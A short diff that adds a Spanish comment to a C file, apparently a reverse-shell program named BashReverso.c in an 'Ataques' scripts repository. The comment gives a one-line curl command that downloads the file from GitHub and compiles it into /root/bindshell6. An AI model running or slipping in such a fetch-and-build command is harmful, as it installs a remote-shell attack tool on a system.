@@ -1,3 +1,7 @@
+// 
+// Descarga remota y compilación:
+//  curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/BashReverso.c > /tmp/BashReverso.c; gcc /tmp/BashReverso.c -o /root/bindshell6
+//
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
